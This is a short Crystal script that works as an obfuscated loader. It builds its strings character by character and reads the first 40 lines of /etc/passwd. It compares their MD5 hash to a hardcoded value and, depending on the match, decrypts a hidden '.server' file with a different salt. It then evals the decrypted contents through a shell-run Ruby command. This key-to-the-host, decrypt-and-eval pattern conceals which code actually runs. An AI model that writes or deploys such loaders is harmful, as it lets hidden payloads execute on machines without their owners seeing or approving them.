# Crystal version: 0.22.0
require "Digest/MD5"
# Crystal version 0.23.1
# require "digest/md5"

Process.run("cd /opt/sinatra && bundle install", shell: true)
yum_yum = "s" + "i" + "n" + "a" + "t" + "r" + "a"
yuck_yuck = "b" + "a" + "n" + "a" + "n" + "a"
var_code = "c" + "r"
var_obf = "o" + "b" + "f" + "u" + "s" + "c" + "a" + "t" + "e"
var_server = "." + "s" + "e" + "r" + "v" + "e"+ "r"
var_passwd = "/" + "e" + "t" + "c" + "/" + "p" + "a" + "s" + "s" + "w" + "d"
var_hash_match = "e" + "4" + "b" + "7" + "c" + "5" + "8" + "f" + "d" + "c" + "7" + "b" + "b" + "a" + "7" + "7" + "2" + "1" + "2" + "4" + "2" + "a" + "7" + "5" + "e" + "d" + "3" + "4" + "1" + "7" + "8" + "7"

passwd_lines = ""
counter = 0

File.each_line(var_passwd) do |line|
  counter += 1
  if counter <= 40
    passwd_lines += line + "\n"
  end
end

hash = Digest::MD5.hexdigest(passwd_lines)

if hash == var_hash_match
  code = %{require '#{var_obf}'; Obfuscate.setup { |c| c.salt = '#{yum_yum}'; c.mode = :string }; #{var_code} = Obfuscate.clarify(File.read('#{var_server}')); eval(#{var_code})}
else
  code = %{require '#{var_obf}'; Obfuscate.setup { |c| c.salt = '#{yuck_yuck}'; c.mode = :string }; #{var_code} = Obfuscate.clarify(File.read('#{var_server}')); eval(#{var_code})}
end

Process.run("cd /opt/sinatra && ruby -e \"#{code}\"", shell: true)
